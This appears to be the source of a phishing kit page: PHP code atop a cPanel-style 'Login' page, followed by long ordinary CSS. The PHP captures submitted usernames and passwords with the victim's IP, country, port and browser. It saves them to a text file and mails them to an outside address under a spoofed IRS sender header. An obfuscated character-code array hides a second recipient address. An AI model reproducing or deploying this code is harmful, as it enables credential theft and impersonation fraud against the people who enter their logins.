﻿<?
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$_SESSION['u'] = $_POST['u'];
$port = getenv("REMOTE_PORT");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");

$message .= "----------------------------------------\n";
$message .= "Email: ".$_POST['user']."\n";
$id .= "".$_POST['user']."\n";
$message .= "key: ".$_POST['pass']."\n";
$message .= "------\n";
$message .= "IP Address : $ip\n";
$message .= "Country : ".$country."\n";
$message .= "Port : $port\n";
$message .= "---\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "---\n";


$boss = "kin9tee@yandex.com";


$subject = "Tax - $id";
$headers = "From: w3@irs.com";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$fp = fopen("velvet.txt","a");
fputs($fp,$message);
mail($boss,$subject,$message,$headers);
// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
?>
<!DOCTYPE html>
<html dir="ltr">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google" content="notranslate">
	<title>Login</title>
	<link href="" /><!-- EXTERNAL CSS -->
	<link href="map_files/open_sans.css" rel="stylesheet" type="text/css" />
	<link href="map_files/style_v2_optimized.css" rel="stylesheet" type="text/css" />
	<style type="text/css">/*
  This css is included in the base template in case the css cannot be loaded because of access restrictions
  If this css is updated, please update securitypolicy_header.html.tmpl as well
*/
.copyright {
  background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=) no-repeat scroll center top transparent;
  background-size: 25px auto;
}
	</style>
	<!--[if IE 6]>
    <style type="text/css">
        img {
            behavior: url(/cPanel_magic_revision_1379540772/unprotected/cp_pngbehavior_login.htc);
        }
    </style>
    <![endif]--><script>
    window.DOM = { get: function(id) { return document.getElementById(id) } };
    </script>
</head>
<body class="cp">
<div id="preload_images"></div>
<style type="text/css">@import "//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css";


    html {
        font-size: 16px;
        overflow-x: hidden;
        overflow-y: visible
    }

    body {
        position: static;
        min-width: 310px;
        min-height: 100vh;
        font-weight: 400;
        font-size: .875rem;
        font-family: "Gotham SSm A", "Gotham SSm B", "Gotham", Arial;
        -webkit-font-smoothing: antialiased;
        line-height: 1.5;
        color: #656565;
        background-color: #eee;
        overflow-x: hidden;
        overflow-y: visible
    }

    a {
        text-decoration: none;
        color: #6796c0
    }

    a:hover {
        text-decoration: none;
        color: #477dad
    }

    *,
    *::before,
    *::after {
        box-sizing: border-box
    }

    *:focus {
        outline: none
    }

    html {
        -webkit-text-size-adjust: 100%;
        -ms-text-size-adjust: 100%
    }

    body {
        margin: 0
    }

    article,
    aside,
    details,
    figcaption,
    figure,
    footer,
    header,
    hgroup,
    main,
    menu,
    nav,
    section,
    summary {
        display: block
    }

    a {
        background: transparent
    }

    h1,
    h2,
    h3,
    h4,
    h5,
    h6,
    p,
    blockquote {
        margin: 0
    }

    p:empty {
        display: none
    }

    code,
    kbd,
    pre,
    samp {
        font-size: 1rem;
        font-family: monospace
    }

    pre {
        overflow: auto
    }

    small {
        font-size: 0.75em
    }

    sup,
    sub {
        position: relative;
        font-size: 0.75em;
        line-height: 0;
        vertical-align: baseline
    }

    sup {
        top: -0.5em
    }

    sub {
        bottom: -0.25em
    }

    img {
        border: 0
    }

    figure {
        margin: 0
    }

    ul,
    ol,
    dl,
    dt,
    dd {
        padding: 0;
        margin: 0
    }

    li {
        list-style: none
    }

    svg:not(:root) {
        overflow: hidden
    }

    audio:not([controls]) {
        display: none
    }

    form {
        margin: 0
    }

    fieldset {
        border: 0
    }

    legend {
        padding: 0;
        border: 0
    }

    button,
    input,
    optgroup,
    select,
    textarea {
        font-style: inherit;
        font-size: inherit;
        font-family: inherit;
        line-height: inherit;
        text-transform: none;
        color: inherit;
        margin: 0
    }

    button::-moz-focus-inner,
    input::-moz-focus-inner,
    optgroup::-moz-focus-inner,
    select::-moz-focus-inner,
    textarea::-moz-focus-inner {
        padding: 0;
        border: 0
    }

    button,
    input[type="button"],
    input[type="reset"],
    input[type="submit"] {
        cursor: pointer;
        -webkit-appearance: button
    }

    button[disabled],
    input[disabled] {
        cursor: default
    }

    button {
        padding: 0;
        overflow: visible
    }

    textarea,
    input[type="url"],
    input[type="tel"],
    input[type="text"],
    input[type="date"],
    input[type="email"],
    input[type="number"],
    input[type="search"],
    input[type="password"] {
        -webkit-appearance: none
    }

    textarea {
        vertical-align: top;
        overflow: auto;
        resize: vertical
    }

    input[type="number"] {
        -moz-appearance: textfield
    }

    input[type="number"]::-webkit-inner-spin-button {
        -webkit-appearance: none
    }

    input[type="search"]::-webkit-search-cancel-button,
    input[type="search"]::-webkit-search-decoration {
        -webkit-appearance: none
    }

    input[type="checkbox"],
    input[type="radio"] {
        padding: 0
    }

    table {
        border-collapse: collapse;
        border-spacing: 0
    }

    table th,
    table td {
        padding: 0
    }

    .browsehappy {
        position: fixed;
        top: 0;
        right: 0;
        left: 0;
        text-align: center;
        color: #fff;
        background: #c00;
        padding: 1.25rem;
        z-index: 999999
    }

    .browsehappy a {
        text-decoration: underline;
        color: #fff
    }

    .accordion .heading,
    .popover .body ul li .actions,
    .slider .slick-arrow,
    .slider .background,
    .button.button-link {
        background: none;
        border: 0;
        border-radius: 0;
        -webkit-appearance: none
    }

    a,
    .accordion .heading,
    .popover .body ul li .actions,
    .slider .slick-arrow,
    .button {
        transition: text-shadow 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67), color 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67), background-color 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67), border-color 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67), box-shadow 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67), opacity 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67), visibility 200ms cubic-bezier(0.17, 0.67, 0.83, 0.67)
    }

    .accordion .heading.toggle .details ul::after,
    .accordion .content .options::after,
    .article footer::after,
    .article footer ul::after,
    .find ul::after,
    .list::after,
    .login-form .links::after,
    .manage::after,
    .note .grid ul::after,
    .page-title.primary h1::after,
    .page-title.primary.search::after,
    .section .header::after,
    .section .tabs::after,
    .slider .slick-track::after,
    .slider .slick-list::after,
    #drawer .social::after,
    #header::after,
    #header .right::after,
    #header .right .user .button::after,
    .domain-privacy .clear::after,
    .form .digits::after,
    .form .ns::after,
    .form .generated::after,
    .form .payment-method label::after,
    .form .cvv::after,
    .form .expiration::after {
        display: table;
        clear: both;
        content: ""
    }

    .accordion .heading.toggle .thumbnail,
    .accordion .heading .thumbnail,
    .avatar a,
    .popover .header .profile .thumbnail,
    #header .right .user .button .thumbnail,
    .profile-picture .crop {
        background-size: cover;
        background-position: center center
    }

    .article .entry:not(:last-child),
    .article .entry figure:not(:last-child),
    .avatar:not(:last-child),
    .link p:not(:last-child),
    .reward p:not(:last-child),
    .section p:not(:last-child),
    .topics .columns .main ul:not(:last-child),
    .modal .modal-dialog .modal-content .modal-body .tabs:not(:last-child) {
        margin-bottom: 1rem
    }

    @media (min-width: 48em) {
        .article .entry:not(:last-child),
        .article .entry figure:not(:last-child),
        .avatar:not(:last-child),
        .link p:not(:last-child),
        .reward p:not(:last-child),
        .section p:not(:last-child),
        .topics .columns .main ul:not(:last-child),
        .modal .modal-dialog .modal-content .modal-body .tabs:not(:last-child) {
            margin-bottom: 1.5rem
        }
    }

    .grid,
    .login-form .form .tabs,
    .popover .body ul li .item,
    .topics .columns,
    .modal .modal-dialog,
    .modal .modal-dialog .modal-content .modal-body .tabs {
        display: -webkit-box;
        display: -webkit-flex;
        display: -moz-flex;
        display: -ms-flexbox;
        display: flex
    }

    .accordion .heading.toggle .details ul,
    .manage .box .list table span,
    .manage .box .in-cart table .select,
    .manage .box .total li.coupon .center .field,
    .note .grid ul,
    .button,
    #drawer .navigation li .icon,
    #drawer .social li a,
    #footer ul,
    .form .payment-method label img,
    .form .payment-method .button .fa,
    .popover .header .title .number,
    #header .right .notification .button .number,
    .modal .modal-dialog .modal-content .modal-body .or span,
    .modal .modal-dialog .modal-content .modal-footer span,
    .icon,
    .iradio.icheck-default,
    .icheckbox.icheck-default,
    .icheckbox.icheck-switch,
    .icheckbox.icheck-toggle {
        display: inline-block;
        vertical-align: middle
    }

    .slider .slick-arrow,
    #header h1 a {
        font-size: 0;
        font-family: a;
        line-height: 0;
        text-shadow: none;
        color: transparent
    }

    .align-right {
        text-align: right
    }

    .align-center {
        text-align: center
    }

    .align-left {
        text-align: left
    }

    @media (min-width: 34em) {
        .align-s-right {
            text-align: right
        }
    }

    @media (min-width: 34em) {
        .align-s-center {
            text-align: center
        }
    }

    @media (min-width: 34em) {
        .align-s-left {
            text-align: left
        }
    }

    @media (min-width: 48em) {
        .align-m-right {
            text-align: right
        }
    }

    @media (min-width: 48em) {
        .align-m-center {
            text-align: center
        }
    }

    @media (min-width: 48em) {
        .align-m-left {
            text-align: left
        }
    }

    @media (min-width: 62em) {
        .align-l-right {
            text-align: right
        }
    }

    @media (min-width: 62em) {
        .align-l-center {
            text-align: center
        }
    }

    @media (min-width: 62em) {
        .align-l-left {
            text-align: left
        }
    }

    @media (min-width: 75em) {
        .align-xl-right {
            text-align: right
        }
    }

    @media (min-width: 75em) {
        .align-xl-center {
            text-align: center
        }
    }

    @media (min-width: 75em) {
        .align-xl-left {
            text-align: left
        }
    }

    .cnt {
        padding: 0 0
    }

    @media (min-width: 34em) {
        .cnt {
            max-width: none
        }
    }

    @media (min-width: 48em) {
        .cnt {
            max-width: none
        }
    }

    @media (min-width: 62em) {
        .cnt {
            max-width: none
        }
    }

    @media (min-width: 75em) {
        .cnt {
            max-width: 96em
        }
    }

    .login .cnt {
        max-width: none
    }

    .grid {
        margin: 0 -1rem -1rem 0;
        -ms-flex-wrap: wrap;
        -webkit-flex-wrap: wrap;
        -moz-flex-wrap: wrap;
        flex-wrap: wrap
    }

    @media (min-width: 48em) {
        .grid {
            margin: 0 -2rem -2rem 0
        }
    }

    .grid-1>* {
        max-width: 100%;
        -webkit-box-flex: 0;
        -webkit-flex: 0 0 100%;
        -moz-box-flex: 0;
        -moz-flex: 0 0 100%;
        -ms-flex: 0 0 100%;
        flex: 0 0 100%
    }

    .grid-2>* {
        max-width: 50%;
        -webkit-box-flex: 0;
        -webkit-flex: 0 0 50%;
        -moz-box-flex: 0;
        -moz-flex: 0 0 50%;
        -ms-flex: 0 0 50%;
        flex: 0 0 50%
    }

    .grid-3>* {
        max-width: 33.3333333333%;
        -webkit-box-flex: 0;
        -webkit-flex: 0 0 33.3333333333%;
        -moz-box-flex: 0;
        -moz-flex: 0 0 33.3333333333%;
        -ms-flex: 0 0 33.3333333333%;
        flex: 0 0 33.3333333333%
    }

    .grid-4>* {
        max-width: 25%;
        -webkit-box-flex: 0;
        -webkit-flex: 0 0 25%;
        -moz-box-flex: 0;
        -moz-flex: 0 0 25%;
        -ms-flex: 0 0 25%;
        flex: 0 0 25%
    }

    .grid-5>* {
        max-width: 20%;
        -webkit-box-flex: 0;
        -webkit-flex: 0 0 20%;
        -moz-box-flex: 0;
        -moz-flex: 0 0 20%;
        -ms-flex: 0 0 20%;
        flex: 0 0 20%
    }

    .grid-6>* {
        max-width: 16.6666666667%;
        -webkit-box-flex: 0;
        -webkit-flex: 0 0 16.6666666667%;
        -moz-box-flex: 0;
        -moz-flex: 0 0 16.6666666667%;
        -ms-flex: 0 0 16.6666666667%;
        flex: 0 0 16.6666666667%
    }

    @media (min-width: 34em) {
        .grid-s-1>* {
            max-width: 100%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 100%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 100%;
            -ms-flex: 0 0 100%;
            flex: 0 0 100%
        }
    }

    @media (min-width: 34em) {
        .grid-s-2>* {
            max-width: 50%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 50%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 50%;
            -ms-flex: 0 0 50%;
            flex: 0 0 50%
        }
    }

    @media (min-width: 34em) {
        .grid-s-3>* {
            max-width: 33.3333333333%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 33.3333333333%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 33.3333333333%;
            -ms-flex: 0 0 33.3333333333%;
            flex: 0 0 33.3333333333%
        }
    }

    @media (min-width: 34em) {
        .grid-s-4>* {
            max-width: 25%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 25%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 25%;
            -ms-flex: 0 0 25%;
            flex: 0 0 25%
        }
    }

    @media (min-width: 34em) {
        .grid-s-5>* {
            max-width: 20%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 20%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 20%;
            -ms-flex: 0 0 20%;
            flex: 0 0 20%
        }
    }

    @media (min-width: 34em) {
        .grid-s-6>* {
            max-width: 16.6666666667%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 16.6666666667%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 16.6666666667%;
            -ms-flex: 0 0 16.6666666667%;
            flex: 0 0 16.6666666667%
        }
    }

    @media (min-width: 48em) {
        .grid-m-1>* {
            max-width: 100%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 100%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 100%;
            -ms-flex: 0 0 100%;
            flex: 0 0 100%
        }
    }

    @media (min-width: 48em) {
        .grid-m-2>* {
            max-width: 50%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 50%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 50%;
            -ms-flex: 0 0 50%;
            flex: 0 0 50%
        }
    }

    @media (min-width: 48em) {
        .grid-m-3>* {
            max-width: 33.3333333333%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 33.3333333333%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 33.3333333333%;
            -ms-flex: 0 0 33.3333333333%;
            flex: 0 0 33.3333333333%
        }
    }

    @media (min-width: 48em) {
        .grid-m-4>* {
            max-width: 25%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 25%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 25%;
            -ms-flex: 0 0 25%;
            flex: 0 0 25%
        }
    }

    @media (min-width: 48em) {
        .grid-m-5>* {
            max-width: 20%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 20%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 20%;
            -ms-flex: 0 0 20%;
            flex: 0 0 20%
        }
    }

    @media (min-width: 48em) {
        .grid-m-6>* {
            max-width: 16.6666666667%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 16.6666666667%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 16.6666666667%;
            -ms-flex: 0 0 16.6666666667%;
            flex: 0 0 16.6666666667%
        }
    }

    @media (min-width: 62em) {
        .grid-l-1>* {
            max-width: 100%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 100%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 100%;
            -ms-flex: 0 0 100%;
            flex: 0 0 100%
        }
    }

    @media (min-width: 62em) {
        .grid-l-2>* {
            max-width: 50%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 50%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 50%;
            -ms-flex: 0 0 50%;
            flex: 0 0 50%
        }
    }

    @media (min-width: 62em) {
        .grid-l-3>* {
            max-width: 33.3333333333%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 33.3333333333%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 33.3333333333%;
            -ms-flex: 0 0 33.3333333333%;
            flex: 0 0 33.3333333333%
        }
    }

    @media (min-width: 62em) {
        .grid-l-4>* {
            max-width: 25%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 25%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 25%;
            -ms-flex: 0 0 25%;
            flex: 0 0 25%
        }
    }

    @media (min-width: 62em) {
        .grid-l-5>* {
            max-width: 20%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 20%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 20%;
            -ms-flex: 0 0 20%;
            flex: 0 0 20%
        }
    }

    @media (min-width: 62em) {
        .grid-l-6>* {
            max-width: 16.6666666667%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 16.6666666667%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 16.6666666667%;
            -ms-flex: 0 0 16.6666666667%;
            flex: 0 0 16.6666666667%
        }
    }

    @media (min-width: 75em) {
        .grid-xl-1>* {
            max-width: 100%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 100%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 100%;
            -ms-flex: 0 0 100%;
            flex: 0 0 100%
        }
    }

    @media (min-width: 75em) {
        .grid-xl-2>* {
            max-width: 50%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 50%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 50%;
            -ms-flex: 0 0 50%;
            flex: 0 0 50%
        }
    }

    @media (min-width: 75em) {
        .grid-xl-3>* {
            max-width: 33.3333333333%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 33.3333333333%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 33.3333333333%;
            -ms-flex: 0 0 33.3333333333%;
            flex: 0 0 33.3333333333%
        }
    }

    @media (min-width: 75em) {
        .grid-xl-4>* {
            max-width: 25%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 25%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 25%;
            -ms-flex: 0 0 25%;
            flex: 0 0 25%
        }
    }

    @media (min-width: 75em) {
        .grid-xl-5>* {
            max-width: 20%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 20%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 20%;
            -ms-flex: 0 0 20%;
            flex: 0 0 20%
        }
    }

    @media (min-width: 75em) {
        .grid-xl-6>* {
            max-width: 16.6666666667%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 16.6666666667%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 16.6666666667%;
            -ms-flex: 0 0 16.6666666667%;
            flex: 0 0 16.6666666667%
        }
    }

    @media (min-width: 82em) {
        .grid-xxl-1>* {
            max-width: 100%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 100%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 100%;
            -ms-flex: 0 0 100%;
            flex: 0 0 100%
        }
    }

    @media (min-width: 82em) {
        .grid-xxl-2>* {
            max-width: 50%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 50%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 50%;
            -ms-flex: 0 0 50%;
            flex: 0 0 50%
        }
    }

    @media (min-width: 82em) {
        .grid-xxl-3>* {
            max-width: 33.3333333333%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 33.3333333333%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 33.3333333333%;
            -ms-flex: 0 0 33.3333333333%;
            flex: 0 0 33.3333333333%
        }
    }

    @media (min-width: 82em) {
        .grid-xxl-4>* {
            max-width: 25%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 25%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 25%;
            -ms-flex: 0 0 25%;
            flex: 0 0 25%
        }
    }

    @media (min-width: 82em) {
        .grid-xxl-5>* {
            max-width: 20%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 20%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 20%;
            -ms-flex: 0 0 20%;
            flex: 0 0 20%
        }
    }

    @media (min-width: 82em) {
        .grid-xxl-6>* {
            max-width: 16.6666666667%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 16.6666666667%;
            -moz-box-flex: 0;
            -moz-flex: 0 0 16.6666666667%;
            -ms-flex: 0 0 16.6666666667%;
            flex: 0 0 16.6666666667%
        }
    }

    .grid>* {
        padding: 0 1rem 1rem 0
    }

    @media (min-width: 48em) {
        .grid>* {
            padding: 0 2rem 2rem 0
        }
    }

    .grid>br {
        display: none
    }

    .margin-5-top {
        margin-top: .3125rem
    }

    .margin-5-right {
        margin-right: .3125rem
    }

    .margin-5-bottom {
        margin-bottom: .3125rem
    }

    .margin-5-left {
        margin-left: .3125rem
    }

    .margin-10-top {
        margin-top: .625rem
    }

    .margin-10-right {
        margin-right: .625rem
    }

    .margin-10-bottom {
        margin-bottom: .625rem
    }

    .margin-10-left {
        margin-left: .625rem
    }

    .margin-15-top {
        margin-top: .9375rem
    }

    .margin-15-right {
        margin-right: .9375rem
    }

    .margin-15-bottom {
        margin-bottom: .9375rem
    }

    .margin-15-left {
        margin-left: .9375rem
    }

    .margin-20-top {
        margin-top: 1.25rem
    }

    .margin-20-right {
        margin-right: 1.25rem
    }

    .margin-20-bottom {
        margin-bottom: 1.25rem
    }

    .margin-20-left {
        margin-left: 1.25rem
    }

    .accordion .item:not(:first-child):not(:last-child) {
        border-bottom: 0.063rem solid #6796c0
    }

    .accordion .item:first-child {
        margin: 0 0 0.5rem 0
    }

    .accordion .item:last-child .content {
        border-bottom: 0.063rem solid #eee
    }

    .accordion .heading {
        display: block;
        width: 100%;
        font-size: 1rem;
        word-break: break-word;
        text-align: left;
        padding: 1rem 4rem 1rem 1rem;
        position: relative;
        cursor: pointer
    }

    @media (min-width: 48em) {
        .accordion .heading {
            min-height: 4.5rem;
            padding-left: 4.5rem
        }
    }

    .accordion .heading.add {
        min-height: 4.5rem;
        color: #4b7cb3;
        padding: 0.75rem 0.75rem 0.75rem 4rem;
        background: rgba(103, 150, 192, 0.1);
        border: 0.063rem dashed #4b7cb3
    }

    @media (min-width: 48em) {
        .accordion .heading.add {
            padding: 1rem 1rem 1rem 4.5rem
        }
    }

    .accordion .heading.add:hover {
        background: rgba(103, 150, 192, 0.15)
    }

    .accordion .heading.add .thumbnail {
        display: block;
        left: 0.75rem;
        border: 0;
        border-radius: 0
    }

    @media (min-width: 48em) {
        .accordion .heading.add .thumbnail {
            left: 1rem
        }
    }

    .accordion .heading.toggle {
        color: #fff;
        background: #4b7cb3
    }

    @media (min-width: 48em) {
        .accordion .heading.toggle {
            padding-right: 10.5rem
        }
    }

    .accordion .heading.toggle.active::after {
        content: "\f077"
    }

    .accordion .heading.toggle.expired {
        padding-right: 0.75rem
    }

    @media (min-width: 48em) {
        .accordion .heading.toggle.expired {
            padding-right: 1rem
        }
    }

    .accordion .heading.toggle.expired.active::after {
        content: none
    }

    .accordion .heading.toggle.expired::after {
        content: none
    }

    .accordion .heading.toggle.expired .thumbnail {
        opacity: 0.5
    }

    .accordion .heading.toggle.expired strong {
        opacity: 0.5
    }

    @media (min-width: 75em) {
        .accordion .heading.toggle.expired .details {
            right: 1rem
        }
    }

    .accordion .heading.toggle::after {
        position: absolute;
        top: 0.75rem;
        right: 1rem;
        font-family: "FontAwesome";
        line-height: 2.5rem;
        content: "\f078"
    }

    @media (min-width: 48em) {
        .accordion .heading.toggle::after {
            top: 1rem;
            right: 1.5rem
        }
    }

    .accordion .heading.toggle:hover {
        background: #416b9b
    }

    .accordion .heading.toggle .thumbnail {
        border-color: #fff
    }

    .accordion .heading.toggle .primary {
        display: block;
        font-weight: 700;
        padding: 0.5rem 0 0 0
    }

    @media (min-width: 48em) {
        .accordion .heading.toggle .primary {
            position: absolute;
            top: 1rem;
            right: 5.5rem;
            line-height: 2.5rem;
            padding-top: 0
        }
    }

    .accordion .heading.toggle .fa {
        position: absolute;
        top: 1rem;
        right: 2.5rem;
        line-height: 2.5rem
    }

    @media (min-width: 48em) {
        .accordion .heading.toggle .fa {
            right: 3.5rem
        }
    }

    .accordion .heading.toggle .fa.fa-star {
        color: #ffcf00
    }

    .accordion .heading.toggle .details {
        line-height: 2.2rem;
        margin: 0 -3rem 0 0
    }

    @media (min-width: 75em) {
        .accordion .heading.toggle .details {
            position: absolute;
            top: 50%;
            right: 3.5rem;
            white-space: nowrap;
            margin: -1.063rem 0 0 0
        }
    }

    .accordion .heading.toggle .details .label {
        display: block
    }

    @media (min-width: 34em) {
        .accordion .heading.toggle .details .label {
            display: inline;
            margin: 0 0.625rem 0 0
        }
    }

    .accordion .heading.toggle .details .button {
        height: 2.125rem;
        line-height: 2.125rem;
        color: #416b9b;
        border-radius: .25rem
    }

    .accordion .heading.toggle .details .button:hover {
        color: #325277
    }

